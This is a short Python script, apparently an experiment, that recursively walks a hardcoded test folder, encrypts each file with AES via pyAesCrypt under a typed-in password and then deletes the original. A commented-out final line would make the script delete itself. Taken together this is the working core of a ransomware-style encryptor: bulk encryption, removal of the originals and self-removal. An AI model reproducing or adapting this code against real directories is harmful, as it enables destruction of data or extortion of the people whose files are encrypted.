import pyAesCrypt
import os
import sys

# file encryption function
def encryption(file,password):

    # buffer size
    buffer_size = 512 * 1024

    # encryption method
    pyAesCrypt.encryptFile(
        str(file),
        str(file) + ".crp",
        password,
        buffer_size
    )

    # print the encrypted file name
    print("[File '" + str(os.path.splitext(file)[0]) + "'encrypted]")

    #delte the old file
    os.remove(file)

# directories scanning function
def walking_by_dirs(dir, password):

    # go through all under directories in a given directory
    for name in os.listdir(dir):
        path = os.path.join(dir, name)

        # encrypt file if you find one
        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as ex:
                print(ex)
        # if we find directory, repeat the file search
        else:
            walking_by_dirs(path, password)

password = input("Enter password for encryption: ")
walking_by_dirs("/Users/andreybyhalenko/Desktop/test_encryption", password)

# remove scripts after done
# os.remove(str(sys.argv[0]))
